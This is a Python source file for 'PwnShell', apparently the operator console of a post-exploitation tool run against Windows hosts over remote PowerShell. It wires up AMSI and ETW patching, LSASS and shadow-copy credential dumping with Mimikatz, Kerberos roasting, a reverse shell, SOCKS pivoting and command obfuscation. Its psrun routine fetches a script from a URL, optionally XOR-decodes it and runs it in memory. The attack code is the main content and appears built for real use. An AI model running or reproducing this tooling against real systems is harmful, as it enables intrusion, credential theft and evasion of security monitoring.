"""
shell.pwnshell — PwnShell v2.0 Operator Interactive Shell
"""

import os
import sys
import re
import binascii
import logging
import time
import textwrap
import stat
import secrets
import subprocess
from pathlib import PureWindowsPath, Path
from ipaddress import ip_address
from base64 import b64decode, b64encode
from datetime import datetime
from typing import Optional, List, Dict, Any, Callable
from urllib.parse import urlparse
from Cryptodome.Hash import SHA256

try:
    from prompt_toolkit import prompt, ANSI
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.completion import WordCompleter
    _PTK = sys.stdout.isatty()
except ImportError:
    _PTK = False

# ── imports from sibling modules ─────────────────────────────────────────────
from ..core.utils import strip_ansi
from ..core.session_mgr import SessionManager
from ..core.tunnel import Socks5Server, PortForwarder
from ..core.loot import LootManager
from ..core.opsec import OPSECProfile
from ..core.noconsolation import (
    NoConsolationError,
    NoConsolationOptions,
    inspect_pe,
    load_noconsolation_assets,
    load_operator_payload,
    pack_noconsolation_arguments,
)
from ..modules import ModuleManager

from .ui       import R, G, Y, B, M, C, W, DIM, BLD, RST, c, _BANNER, _COMPLETIONS
from .ctrlc    import CtrlCHandler
from .adtriage  import get_adtriage_ps
from .shares    import get_shares_ps
from .sessions  import get_sessions_ps
from .commands import (
    chunks, b64str, split_args, xorenc, str_b64,
    _xor_key, build_amsi_patch,
    new_HostWriter, import_HostWriter,
    call_XorEnc, import_XorEnc,
    # dll_import generated variables:
    _import_LoadLibrary,    _call_LoadLibrary,
    _import_GetProcAddress, _call_GetProcAddress,
    _import_VirtualProtect, _call_VirtualProtect,
    _import_CreateProcess,  _call_CreateProcess,
    _import_WSAStartup,     _call_WSAStartup,
    _import_WSASocket,      _call_WSASocket,
    _import_WSAConnect,     _call_WSAConnect,
)


# ── Session data directory & History Security ─────────────────────────────────
# [BUG-01 & NICHE-01 FIX] Enforce 0o700 permission on _PWNRM_DIR so other local
# users cannot read command history or transcript logs containing credentials.
_PWNRM_DIR = Path(os.environ.get("PWNRM_DIR", str(Path.home() / ".pwnrm")))
if _PWNRM_DIR.is_symlink():
    raise RuntimeError(f"PWNRM_DIR cannot be a symbolic link: {_PWNRM_DIR}")
_PWNRM_DIR.mkdir(parents=True, exist_ok=True)
if _PWNRM_DIR.is_symlink() or not _PWNRM_DIR.is_dir():
    raise RuntimeError(f"PWNRM_DIR is not a real directory: {_PWNRM_DIR}")
try:
    os.chmod(_PWNRM_DIR, stat.S_IRWXU)
    import platform
    if platform.system() == "Windows":
        import subprocess
        user = os.environ.get("USERNAME")
        if user:
            subprocess.run(
                ["icacls", str(_PWNRM_DIR), "/inheritance:r", "/grant", f"{user}:(OI)(CI)F"],
                capture_output=True,
                creationflags=0x08000000
            )
except OSError:
    pass

# [OPT-08] Sensitive pattern filter to prevent storing credentials in history
HISTORY_EXCLUDE_PATTERN = re.compile(
    r'(?:(?<!\S)(?:-p|--password|-H|--hash|--pfx-pass)(?=\s|=|$)|'
    r'\b(?:password|passwd|secret|tgskey|nt_hash|mimikatz|secretsdump|lsass|ccache|kirbi|dpapi)\b)',
    re.IGNORECASE
)


if "FileHistory" in globals():
    class SafeFileHistory(FileHistory):
        """Prompt history that never retains commands likely to contain secrets."""

        def append_string(self, string: str) -> None:
            if HISTORY_EXCLUDE_PATTERN.search(string):
                return
            super().append_string(string)
else:  # pragma: no cover - prompt_toolkit is a declared runtime dependency
    SafeFileHistory = None


# ── Command Registry (OPT-03) ────────────────────────────────────────────────
COMMAND_REGISTRY = {
    "Core Platform & Pivoting (v2.1)": {
        "!session [list|switch|save|exec-all]": "Multi-session manager & jump graph",
        "!socks [PORT|stop|status]": "Direct local SOCKS5 proxy (default: 1080)",
        "!portfwd [LPORT RHOST:RPORT|list|stop]": "Direct local TCP port forwarder",
        "!ligolo [--remote] AGENT [ARG..]": "Launch a detached in-memory Ligolo-ng agent",
        "!module [list|run <name>]": "Extensible module & plugin subsystem",
        "!loot": "View organized credentials & artifacts",
        "!opsec [stealth|balanced|aggressive|hybrid-cloud]": "Toggle execution jitter & profile",
        "!playbook [list|run <name>|run --file PATH]": "Declarative red team playbook runner",
    },
    "Identity & Active Directory Assessment": {
        "!adcs [--quick] [--template <T>] [--ca <CA>] [--alt SAN] [--wsus]": "ADCS CA/template/ACL & WSUS triage",
        "!kerberos [roast|asrep|rbcd|dmsa|diamond]": "Kerberos exposure, RBCD and dMSA triage",
        "!entra [full]": "Entra join-state and cloud-cache inventory",
        "!creds [vault|dpapi|decrypt B64|history|browser|lsa] [--lsa-executor PE] [--lsa-timeout SEC] [--lsa-output PATH] [--download]": "Credential artifacts & fast LSASS extraction",
        "!laps [all|encrypted]": "Windows LAPS hunter (Legacy & Server 2025)",
        "!acl [tier0] [--target <T>]": "Active Directory DACL & privilege escalation scout",
        "!token [list|privs]": "Process token inventory & privilege audit",
        "!bloodhound [--collection <methods>]": "AD graph reconnaissance summary",
        "!lateral [--subnet <s>] [--ports P] [--probe-auth]": "Bounded subnet and service scout",
    },
    "Collection, Runtime & In-Memory Execution": {
        "!vss [sam|lsa|ntds] [--mimikatz] [--mimikatz-executor PE] [--user USER] [--drive C:] [--download]": "Diskless Mimikatz or ephemeral VSS secret extraction",
        "!coerce [webdav|smb|all] --listener <IP> [--port N]": "Outbound UNC authentication probe",
        "!evasion [edr|amsi|etw]": "Runtime AMSI/ETW patch & EDR scout",
        "!adtriage [--quick]": "AD post-auth quick triage",
        "!shares [--quick] [HOST..]": "SMB share permission mapper",
        "!sessions [--quick]": "Logon sessions & network snapshot",
        "!sysinfo": "Quick OS / AV / hotfix snapshot",
        "!download RPATH [LPATH]": "Pull file/dir (dirs -> ZIP)",
        "!upload [--xor] LPATH [RPATH]": "Push file (--xor for stealth)",
        "!amsi": "Patch AmsiScanBuffer in-process (polymorphic)",
        "!psrun [--xor] URL": "Load & exec remote PS1",
        "!netrun [--xor] URL [ARG..]": "Load & exec remote .NET assembly",
        "!noconsolation [native|managed] [--capture-output|--detached] [--remote] [--timeout SEC] SOURCE [ARG..]": "Run managed/native PE from memory",
        "!revshell IP PORT": "Raw Winsock reverse shell",
        "!log / !stoplog": "Toggle session transcript",
        "exit / quit / Ctrl+D": "Close session",
    }
}


class PwnShell:

    from .. import __version__ as _pkg_version
    VERSION = _pkg_version

    def __init__(self, runspace, target_info: dict | None = None):
        self.runspace    = runspace
        self.cwd         = ""
        self.stdout_log  = None
        self.need_clear  = False
        self.start_time  = datetime.now()
        self.target_info = target_info or {}
        self.cmd_count   = 0
        self.last_run_errors: List[str] = []

        # Subsystems
        self.session_mgr = SessionManager(base_dir=_PWNRM_DIR)
        self.session_mgr.register_session(self.runspace, getattr(self.runspace, "_transport", None), self.target_info, name="initial")
        self.socks_server: Socks5Server | None = None
        self.port_forwarder = PortForwarder()
        self.loot_mgr = LootManager(base_dir=_PWNRM_DIR)
        self.opsec_profile = OPSECProfile(mode="balanced")
        self.module_mgr = ModuleManager()

        if _PTK:
            hist_path = _PWNRM_DIR / ".pwnrm_history"
            if hist_path.is_symlink():
                hist_path.unlink()
            if not hist_path.exists():
                try:
                    fd = os.open(str(hist_path), os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
                    os.close(fd)
                except OSError:
                    pass
            else:
                try:
                    os.chmod(str(hist_path), stat.S_IRUSR | stat.S_IWUSR)
                except OSError:
                    pass
            self.prompt_history = SafeFileHistory(str(hist_path))
            self._completer = WordCompleter(_COMPLETIONS, ignore_case=True)

    def __del__(self):
        if getattr(self, "stdout_log", None):
            self.stop_log()
        if getattr(self, "socks_server", None):
            self.socks_server.stop()
        if getattr(self, "port_forwarder", None):
            self.port_forwarder.stop_all()

    # ── logging ───────────────────────────────────────────────────────────────
    def start_log(self):
        if not self.stdout_log:
            fn = str(_PWNRM_DIR / f"pwnrm_{int(time.time())}_{secrets.token_hex(4)}_stdout.log")
            self.write_info(f"Logging to {c(C, fn)}")
            flags = os.O_CREAT | os.O_EXCL | os.O_WRONLY | os.O_APPEND
            fd = os.open(fn, flags, 0o600)
            self.stdout_log = os.fdopen(fd, "wb")
            return {"status": "completed", "path": fn}
        return {"status": "completed"}

    def stop_log(self):
        if self.stdout_log:
            self.stdout_log.close()
            self.stdout_log = None
        return {"status": "completed"}

    # ── help / banner (OPT-03) ────────────────────────────────────────────────
    def help(self):
        elapsed = str(datetime.now() - self.start_time).split(".")[0]
        tgt = self.target_info.get("host","?")
        usr = self.target_info.get("user","?")
        socks_status = f"{self.socks_server.bind_port} (Active)" if (self.socks_server and self.socks_server.is_running) else "Inactive"

        print(_BANNER)
        print(textwrap.dedent(f"""\
        {BLD}  Operator Platform Info{RST}
          Target  : {c(C,tgt)}    User: {c(G,usr)}
          Elapsed : {elapsed}    Commands: {self.cmd_count}    OPSEC: {c(Y, self.opsec_profile.mode.upper())}
          SOCKS5  : {c(M, socks_status)}
        """))

        syntax_width = 45
        for section, cmds in COMMAND_REGISTRY.items():
            print(f"  {BLD}{section}{RST}")
            for cmd_syntax, desc in cmds.items():
                if len(cmd_syntax) <= syntax_width:
                    print(f"    {c(Y, cmd_syntax.ljust(syntax_width))} {desc}")
                else:
                    print(f"    {c(Y, cmd_syntax)}")
                    print(f"      {desc}")
            print()

    # ── REPL ──────────────────────────────────────────────────────────────────
    def repl(self, inputs=None):
        self.update_cwd()
        last_result = None
        batch_failure = None

        for raw in (inputs if inputs is not None else self.read_line()):
            cmd = raw.strip()
            if not cmd:
                continue
            self.cmd_count += 1
            self.opsec_profile.jitter_sleep()
            self.last_run_errors = []

            if cmd in {"exit","quit","!exit","!quit"}:
                print(c(DIM, "\n  [~] Session closed. Stay stealthy.\n"))
                return {"status": "closed"}

            dispatch = [
                ("!session",    self._session_dispatch),
                ("!socks",      self._socks_dispatch),
                ("!portfwd",    self._portfwd_dispatch),
                ("!ligolo",     self.ligolo),
                ("!module",     self._module_dispatch),
                ("!loot",       self._loot_dispatch),
                ("!opsec",      self._opsec_dispatch),
                ("!playbook",   self._playbook_dispatch),
                ("!adcs",       lambda args: self.module_mgr.get_module("adcs").run(self, split_args(args))),
                ("!kerberos",   lambda args: self.module_mgr.get_module("kerberos").run(self, split_args(args))),
                ("!entra",      lambda args: self.module_mgr.get_module("entra").run(self, split_args(args))),
                ("!creds",      lambda args: self.module_mgr.get_module("creds").run(self, split_args(args))),
                ("!laps",       lambda args: self.module_mgr.get_module("laps").run(self, split_args(args))),
                ("!acl",        lambda args: self.module_mgr.get_module("acl").run(self, split_args(args))),
                ("!token",      lambda args: self.module_mgr.get_module("token").run(self, split_args(args))),
                ("!vss",        lambda args: self.module_mgr.get_module("vss").run(self, split_args(args))),
                ("!coerce",     lambda args: self.module_mgr.get_module("coerce").run(self, split_args(args))),
                ("!bloodhound", lambda args: self.module_mgr.get_module("bloodhound").run(self, split_args(args))),
                ("!lateral",    lambda args: self.module_mgr.get_module("lateral").run(self, split_args(args))),
                ("!evasion",    lambda args: self.module_mgr.get_module("evasion").run(self, split_args(args))),
                ("!download",   self.download),
                ("!upload",     self.upload),
                ("!amsi",       lambda args: self._no_args_dispatch(args, self.amsi_bypass, "!amsi")),
                ("!netrun",     self.netrun),
                ("!noconsolation", self.noconsolation),
                ("!psrun",      self.psrun),
                ("!revshell",   self.revshell),
                ("!adtriage",   self._adtriage_dispatch),
                ("!shares",     self._shares_dispatch),
                ("!sessions",   self._sessions_dispatch),
                ("!sysinfo",    lambda args: self._no_args_dispatch(args, self.sysinfo, "!sysinfo")),
                ("!log",        lambda args: self._no_args_dispatch(args, self.start_log, "!log")),
                ("!stoplog",    lambda args: self._no_args_dispatch(args, self.stop_log, "!stoplog")),
            ]

            matched = False
            command_name, _, command_args = cmd.partition(" ")
            for prefix, fn in dispatch:
                if command_name.lower() == prefix.lower():
                    arg_str = command_args.strip()
                    last_result = fn(arg_str)
                    if (
                        self.last_run_errors
                        and isinstance(last_result, dict)
                        and last_result.get("status") == "completed"
                    ):
                        last_result = {
                            "status": "error",
                            "error": "; ".join(self.last_run_errors),
                            "result": last_result,
                        }
                    matched = True
                    break

            if not matched:
                if cmd.startswith("!") or cmd in {"help","?"}:
                    self.help()
                    last_result = {"status": "help"}
                else:
                    if self.stdout_log:
                        clean_cmd = strip_ansi(cmd)
                        self.stdout_log.write(f"PS {self.cwd}> {clean_cmd}\n".encode())
                        self.stdout_log.flush()
                    execution_cmd = self.opsec_profile.obfuscate_cmd(cmd)
                    interrupted = self.run_with_interrupt(execution_cmd, self.write_line)
                    if not interrupted:
                        self.update_cwd()
                    if interrupted:
                        last_result = {"status": "interrupted"}
                    elif self.last_run_errors:
                        last_result = {"status": "error", "error": "; ".join(self.last_run_errors)}
                    else:
                        last_result = {"status": "completed"}

            if (
                inputs is not None
                and isinstance(last_result, dict)
                and last_result.get("status") in {"error", "failed", "interrupted"}
                and batch_failure is None
            ):
                batch_failure = last_result

        return batch_failure or last_result

    def _no_args_dispatch(self, args_str: str, callback: Callable, usage: str):
        if split_args(args_str):
            self.write_warning(f"Usage: {usage}")
            return {"status": "error", "error": "unexpected arguments"}
        return callback()

    def _transfer_chunk_size(self) -> int:
        """Return a PSRP-safe chunk size selected by the active profile."""
        profile = getattr(self, "opsec_profile", None)
        configured = int(getattr(profile, "config", {}).get("max_chunk_size", 65536))
        return max(4096, min(configured, 65536))

    # ── prompt / input ────────────────────────────────────────────────────────
    def update_cwd(self):
        self.cwd = strip_ansi(self.run_sync("Get-Location | Select -Expand Path").strip())

    def read_line(self):
        while True:
            try:
                cur_node = self.session_mgr.get_current()
                sid_str = f"S:{cur_node.session_id}|" if cur_node else ""
                ps_pre = f"{BLD}{M}PwnRM{RST}[{c(Y, sid_str + self.target_info.get('host','?'))}]|{c(C,self.cwd)}> "
                if _PTK:
                    cmd = prompt(ANSI(ps_pre), history=self.prompt_history,
                                 completer=self._completer,
                                 enable_history_search=True)
                else:
                    cmd = input(ps_pre)
            except KeyboardInterrupt:
                continue
            except EOFError:
                return
            else:
                yield cmd

    # ── output handlers (OPT-04) ──────────────────────────────────────────────
    def _clear(self):
        return "\033[2K\r" if self.need_clear else ""

    def write_line(self, out: dict):
        clr = self._clear(); self.need_clear = False
        log = b""
        if "stdout" in out:
            txt = strip_ansi(out["stdout"])
            line_end = "" if txt.endswith(("\n", "\r")) else "\n"
            print(clr + txt, end=line_end, flush=True)
            log = (txt + line_end).encode()
        elif "info" in out:
            txt = strip_ansi(out["info"])
            endl = str(out.get("endl", "\n"))
            print(clr + txt, end=endl, flush=True)
            log = (txt + endl).encode()
        elif "error" in out:
            txt = strip_ansi(out["error"])
            print(clr + c(R, txt), flush=True)
            log = f"[ERROR] {txt}\n".encode()
        elif "warn" in out:
            txt = strip_ansi(out["warn"])
            print(clr + c(Y, "  [!] " + txt), flush=True)
            log = f"[WARN] {txt}\n".encode()
        elif "verbose" in out:
            txt = strip_ansi(out["verbose"])
            print(clr + c(DIM, txt), flush=True)
            log = f"[VERBOSE] {txt}\n".encode()
        elif "progress" in out:
            print(clr + c(B, "  [~] " + strip_ansi(out["progress"])), end="\r", flush=True)
            self.need_clear = True
        if self.stdout_log and log:
            # [OPT-04] Guarantee no ANSI color codes are ever written to stdout_log
            self.stdout_log.write(strip_ansi(log.decode("utf-8", errors="replace")).encode("utf-8"))
            self.stdout_log.flush()

    def write_info(self, msg: str):    self.write_line({"info": msg, "endl": "\n"})
    def write_warning(self, msg: str): self.write_line({"warn": msg})
    def write_error(self, msg: str):   self.write_line({"error": msg})
    def write_progress(self, msg: str):self.write_line({"progress": msg})

    # ── Synchronous & Interruptible execution (FIX-08, OPT-01) ────────────────
    MAX_SYNC_BYTES = 1 * 1024 * 1024  # 1 MB [HIGH-05 / FIX-08]

    def run_sync(self, cmd: str, max_bytes: int = MAX_SYNC_BYTES) -> str:
        out = []
        total = 0
        for o in self.runspace.run_command(cmd):
            if "error" in o:
                self.last_run_errors.append(str(o["error"]))
            if "stdout" in o:
                chunk = o["stdout"]
                total += len(chunk.encode("utf-8", errors="replace"))
                if total > max_bytes:
                    out.append("\n[!] run_sync output truncated (exceeded max_bytes protection).")
                    self.write_warning(f"run_sync: output exceeded {max_bytes} bytes, truncated")
                    self.runspace.interrupt()
                    break
                out.append(chunk)
        return "".join(out)

    def run_with_interrupt(self, cmd: str, handler: Optional[Callable] = None, exc_handler: Optional[Callable] = None) -> bool:
        # [OPT-01 FIX] Hold CtrlCHandler across the entire stream iteration to eliminate race window
        stream = self.runspace.run_command(cmd)
        with CtrlCHandler(timeout=5) as h:
            for out in stream:
                if h.interrupted:
                    self.runspace.interrupt()
                    return True
                try:
                    if "error" in out:
                        self.last_run_errors.append(str(out["error"]))
                    if handler:
                        handler(out)
                except Exception as e:
                    if exc_handler and exc_handler(e):
                        continue
                    raise
            if h.interrupted:
                self.runspace.interrupt()
                return True
        return False

    # ══════════════════════════════════════════════════════════════════════════
    #  DISPATCHERS FOR V2.0 PLATFORM SUBSYSTEMS
    # ══════════════════════════════════════════════════════════════════════════

    def _session_dispatch(self, args_str: str):
        args = split_args(args_str)
        subcmd = args[0].lower() if args else "list"
        if subcmd == "list" and len(args) <= 1:
            sessions = self.session_mgr.list_sessions()
            self.write_info(c(C + BLD, "\n  [Active PwnRM Sessions]"))
            for s in sessions:
                cur_marker = c(G, " [*]") if s["is_current"] else "    "
                self.write_info(f"{cur_marker} ID: {c(Y, str(s['id']))} | Name: {s['name']} | Host: {s['host']} | User: {s['user']}")
            print()
            return {"status": "completed", "sessions": sessions}
        elif subcmd == "switch" and len(args) == 2:
            try:
                sid = int(args[1])
                old_node = self.session_mgr.get_current()
                old_sid = old_node.session_id if old_node else -1
                old_host = old_node.host if old_node else "unknown"
                if self.session_mgr.switch_session(sid):
                    node = self.session_mgr.get_current()
                    self.runspace = node.runspace
                    self.target_info = node.target_info
                    self.update_cwd()
                    self.write_info(c(G, f"  [+] Switched to session {sid} ({node.host})"))
                    if self.stdout_log:
                        marker = (
                            f"\n{'─'*72}\n"
                            f"[{datetime.now().isoformat()}] SESSION SWITCH\n"
                            f"  FROM : S:{old_sid} ({old_host})\n"
                            f"  TO   : S:{sid} ({node.host})\n"
                            f"{'─'*72}\n"
                        )
                        self.stdout_log.write(marker.encode("utf-8"))
                        self.stdout_log.flush()
                    return {"status": "completed", "session_id": sid}
                else:
                    self.write_warning(f"Session {sid} not found.")
                    return {"status": "error", "error": "session not found"}
            except ValueError:
                self.write_warning("Session ID must be an integer.")
                return {"status": "error", "error": "invalid session id"}
        elif subcmd == "save" and len(args) == 1:
            fn = self.session_mgr.save_state()
            self.write_info(c(G, f"  [+] Session state saved securely to {fn}"))
            return {"status": "completed", "path": fn}
        elif subcmd == "exec-all" and len(args) > 1:
            fan_cmd = " ".join(args[1:])
            res = self.session_mgr.fan_out_exec(fan_cmd)
            for sid, out in res.items():
                self.write_info(c(Y, f"--- Session {sid} Output ---"))
                self.write_info(out)
            failures = [out for out in res.values() if "[ERROR]" in out]
            if failures:
                return {"status": "error", "error": "; ".join(failures), "results": res}
            return {"status": "completed", "results": res}
        else:
            self.write_warning("Usage: !session [list | switch <id> | save | exec-all <cmd>]")
            return {"status": "error", "error": "invalid session command"}

    def _socks_dispatch(self, args_str: str):
        args = split_args(args_str)
        if not args or args[0].isdigit():
            if len(args) > 1:
                self.write_warning("Usage: !socks [PORT | stop | status]")
                return {"status": "error"}
            port = int(args[0]) if args else 1080
            if not 0 <= port <= 65535:
                self.write_warning("SOCKS5 port must be between 0 and 65535.")
                return {"status": "error"}
            if self.socks_server and self.socks_server.is_running:
                self.write_warning(f"SOCKS5 already running on port {self.socks_server.bind_port}. Stop it first (!socks stop).")
                return {"status": "error"}
            try:
                self.socks_server = Socks5Server(bind_host="127.0.0.1", bind_port=port)
                self.socks_server.start()
            except OSError as exc:
                self.socks_server = None
                self.write_error(f"Failed to start SOCKS5 proxy: {exc}")
                return {"status": "error", "error": str(exc)}
            self.write_info(c(G, f"  [+] Direct local SOCKS5 proxy started on 127.0.0.1:{self.socks_server.bind_port}"))
            return {"status": "completed", "port": self.socks_server.bind_port}
        elif args[0].lower() == "stop":
            if len(args) != 1:
                self.write_warning("Usage: !socks stop")
                return {"status": "error"}
            if self.socks_server:
                self.socks_server.stop()
                self.socks_server = None
                self.write_info(c(Y, "  [*] SOCKS5 Proxy stopped."))
                return {"status": "completed"}
            else:
                self.write_warning("No active SOCKS5 proxy.")
                return {"status": "error"}
        elif args[0].lower() == "status":
            if len(args) != 1:
                self.write_warning("Usage: !socks status")
                return {"status": "error"}
            if self.socks_server and self.socks_server.is_running:
                self.write_info(c(G, f"  [+] SOCKS5 Proxy ACTIVE on {self.socks_server.bind_host}:{self.socks_server.bind_port} ({len(self.socks_server.active_tunnels)} active connections)"))
            else:
                self.write_info("  [-] SOCKS5 Proxy is INACTIVE.")
            return {"status": "completed"}
        self.write_warning("Usage: !socks [PORT | stop | status]")
        return {"status": "error"}

    def _portfwd_dispatch(self, args_str: str):
        args = split_args(args_str)
        if not args or (args[0].lower() == "list" and len(args) == 1):
            forwards = self.port_forwarder.list_forwards()
            self.write_info(c(C + BLD, "\n  [Active Port Forwards]"))
            if not forwards:
                self.write_info("    (No active port forwards)")
            for f in forwards:
                self.write_info(f"    ID: {f['id']} | Bind: {f['bind']} -> Target: {f['target']}")
            print()
            return {"status": "completed", "forwards": forwards}
        elif args[0].lower() == "stop":
            if len(args) != 2:
                self.write_warning("Usage: !portfwd stop <ID|all>")
                return {"status": "error"}
            if args[1].lower() == "all":
                stopped = self.port_forwarder.stop_all()
                self.write_info(c(Y, f"  [*] Stopped {stopped} port forward(s)."))
                return {"status": "completed", "stopped": stopped}
            try:
                fid = int(args[1])
            except ValueError:
                self.write_warning("Port forward ID must be an integer or 'all'.")
                return {"status": "error"}
            if self.port_forwarder.stop_forward(fid):
                self.write_info(c(Y, f"  [*] Port forward {fid} stopped."))
                return {"status": "completed", "stopped": fid}
            else:
                self.write_warning(f"Port forward {fid} not found.")
                return {"status": "error", "error": "forward not found"}
        elif len(args) == 2:
            try:
                lport = int(args[0])
                rhost, rport = args[1].rsplit(":", 1)
                if rhost.startswith("[") and rhost.endswith("]"):
                    rhost = rhost[1:-1]
                fid = self.port_forwarder.start_local_forward(lport, rhost, int(rport))
                created = next(f for f in self.port_forwarder.list_forwards() if f["id"] == fid)
                self.write_info(c(G, f"  [+] Port forward created (ID: {fid}): {created['bind']} -> {created['target']}"))
                return {"status": "completed", "forward": created}
            except Exception as e:
                self.write_error(f"Failed to create port forward: {e}")
                return {"status": "error", "error": str(e)}
        else:
            self.write_warning("Usage: !portfwd <LPORT> <RHOST>:<RPORT> or !portfwd list")
            return {"status": "error"}

    def _module_dispatch(self, args_str: str):
        args = split_args(args_str)
        if not args or (args[0].lower() == "list" and len(args) == 1):
            mods = self.module_mgr.list_modules()
            self.write_info(c(C + BLD, "\n  [Registered PwnRM Modules]"))
            for m in mods:
                self.write_info(f"    - {c(Y, m['name']):<15} {m['description']}")
            print()
            return {"status": "listed", "modules": mods}
        elif args[0].lower() == "run" and len(args) > 1:
            mod_name = args[1]
            mod = self.module_mgr.get_module(mod_name)
            if mod:
                return mod.run(self, args[2:])
            else:
                self.write_warning(f"Module '{mod_name}' not found. Use '!module list'.")
                return {"status": "error", "error": "module not found"}
        else:
            self.write_warning("Usage: !module list or !module run <name> [args]")
            return {"status": "error", "error": "invalid module command"}

    def _loot_dispatch(self, args_str: str = ""):
        if split_args(args_str):
            self.write_warning("Usage: !loot")
            return {"status": "error", "error": "unexpected arguments"}
        summary = self.loot_mgr.summary()
        self.write_info(c(C + BLD, "\n  [PwnRM Structured Loot Inventory]"))
        if not summary:
            self.write_info(f"    (No loot recorded yet under {_PWNRM_DIR / 'loot'})")
        for target, data in summary.items():
            self.write_info(f"  Target: {c(Y, target)}")
            creds = data.get("credentials", [])
            self.write_info(f"    Credentials: {len(creds)} entries")
            for c_ in creds[:5]:
                if isinstance(c_, dict):
                    self.write_info(
                        f"      - [{c_.get('type', '?')}] "
                        f"{c_.get('account', '?')} ({c_.get('source', '?')})"
                    )
            artifacts = data.get("artifacts", {})
            for cat, items in artifacts.items():
                if items:
                    self.write_info(f"    {cat.capitalize()}: {len(items)} files ({', '.join(items[:3])})")
        print()
        return {"status": "completed", "summary": summary}

    def _opsec_dispatch(self, args_str: str):
        args = split_args(args_str)
        if len(args) == 1 and args[0].lower() in OPSECProfile.PROFILES:
            self.opsec_profile.set_mode(args[0].lower())
            self.write_info(c(G, f"  [+] Active OPSEC profile set to: {self.opsec_profile.mode.upper()}"))
            return {"status": "completed", "profile": self.opsec_profile.mode}
        else:
            self.write_info(f"Active profile: {c(Y, self.opsec_profile.mode.upper())}")
            self.write_info("Available profiles: stealth, balanced, aggressive, hybrid-cloud")
            if args:
                return {"status": "error", "error": "unknown OPSEC profile"}
            return {"status": "completed", "profile": self.opsec_profile.mode}

    def _playbook_dispatch(self, args_str: str):
        args = split_args(args_str)
        return self.module_mgr.get_module("playbook").run(self, args)

    # ══════════════════════════════════════════════════════════════════════════
    #  BUILT-IN COMMANDS
    # ══════════════════════════════════════════════════════════════════════════

    # ── !adtriage ─────────────────────────────────────────────────────────────
    def _adtriage_dispatch(self, args):
        parsed = split_args(args)
        if any(arg not in {"-q", "--quick"} for arg in parsed):
            self.write_warning("Usage: !adtriage [--quick]")
            return {"status": "error"}
        return self.adtriage(quick=bool(parsed))

    def adtriage(self, quick=False):
        self.write_info(c(M+BLD, "  [*] PwnRM AD Triage — loading remote enumeration module..."))
        ps = get_adtriage_ps(quick=quick)
        encoded = b64str(ps.encode("utf-16le"))
        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        interrupted = self.run_with_interrupt(cmd, self.write_line)
        return {"status": "interrupted" if interrupted else "completed"}

    # ── !shares ──────────────────────────────────────────────────────────────
    def _shares_dispatch(self, args: str):
        parts = split_args(args)
        quick = False
        targets: list[str] = []
        for p in parts:
            if p.lower() in ("-q", "--quick"):
                quick = True
            else:
                targets.append(p)
        return self.shares(quick=quick, targets=targets)

    def shares(self, quick: bool = False, targets: list[str] | None = None):
        self.write_info(c(M+BLD, "  [*] PwnRM Share Scout — loading remote enumeration module..."))
        ps = get_shares_ps(quick=quick, targets=targets or [])
        encoded = b64str(ps.encode("utf-16le"))
        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        interrupted = self.run_with_interrupt(cmd, self.write_line)
        return {"status": "interrupted" if interrupted else "completed"}

    # ── !sessions ────────────────────────────────────────────────────────────
    def _sessions_dispatch(self, args: str):
        parsed = split_args(args)
        if any(arg not in {"-q", "--quick"} for arg in parsed):
            self.write_warning("Usage: !sessions [--quick]")
            return {"status": "error"}
        return self.sessions(quick=bool(parsed))

    def sessions(self, quick: bool = False):
        self.write_info(c(M+BLD, "  [*] PwnRM Session Scout — loading remote enumeration module..."))
        ps = get_sessions_ps(quick=quick)
        encoded = b64str(ps.encode("utf-16le"))
        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        interrupted = self.run_with_interrupt(cmd, self.write_line)
        return {"status": "interrupted" if interrupted else "completed"}

    # ── !sysinfo ──────────────────────────────────────────────────────────────
    def sysinfo(self):
        self.write_info(c(C, "  [*] System snapshot"))
        cmds = [
            'Write-Host "`n[OS]"; $o=Get-WmiObject Win32_OperatingSystem;'
            '"  Name     : "+$o.Caption; "  Build    : "+$o.BuildNumber;'
            '"  Hostname : "+$env:COMPUTERNAME; "  Domain   : "+$env:USERDNSDOMAIN',
            'Write-Host "`n[Hotfixes (last 10)]";'
            'Get-HotFix | Sort InstalledOn -Desc | Select -First 10 | '
            'ForEach-Object { "  "+$_.HotFixID+" "+$_.Description+" "+$_.InstalledOn }',
            'Write-Host "`n[AV Products]";'
            'try { Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct -ErrorAction Stop |'
            'ForEach-Object { "  "+$_.displayName } } catch { "  (SecurityCenter2 not available)" }',
            'Write-Host "`n[Local Administrators]";'
            'net localgroup administrators 2>$null | Select-Object -Skip 6 | '
            'Where-Object { $_ -and $_ -notmatch "----" } | ForEach-Object { "  "+$_ }',
            'Write-Host "`n[WinRM / SMB]";'
            '"  WinRM port : 5985/5986";'
            'try { $s=Get-SmbServerConfiguration; "  SMB Signing Required: "+$s.RequireSecuritySignature } catch {}',
        ]
        for c_ in cmds:
            if self.run_with_interrupt(c_, self.write_line):
                return {"status": "interrupted"}
        return {"status": "completed"}

    # ── !amsi (FIX-04) ────────────────────────────────────────────────────────
    def amsi_bypass(self):
        return self.module_mgr.get_module("evasion").run(self, ["amsi"])

    # ── !psrun ────────────────────────────────────────────────────────────────
    def psrun(self, cmdline: str):
        args = split_args(cmdline)
        if not args:
            self.write_warning("usage: !psrun [--xor] URL_OR_REMOTE_PATH")
            return {"status": "error"}
        use_xor = args[0].lower() in {"--xor", "-xor"}
        if use_xor:
            args = args[1:]
        if len(args) != 1:
            self.write_warning("usage: !psrun [--xor] URL_OR_REMOTE_PATH")
            return {"status": "error"}
        source = args[0]
        if source.lower().startswith(("http://", "https://")):
            fetch = f"(New-Object Net.WebClient).DownloadData({str_b64(source)})"
        else:
            fetch = f"[IO.File]::ReadAllBytes('{self._pse(source)}')"
        decoded = f"{call_XorEnc}($data)" if use_xor else "$data"
        imports = import_XorEnc if use_xor else ""
        script = f"""
{imports}
$data = {fetch}
try {{
    $text = [Text.Encoding]::UTF8.GetString({decoded})
    $block = [ScriptBlock]::Create($text)
    Invoke-Command -NoNewScope -ScriptBlock $block
}} finally {{
    if ($data) {{ [Array]::Clear($data, 0, $data.Length) }}
    Remove-Variable @('data','text','block') -ErrorAction SilentlyContinue
}}
"""
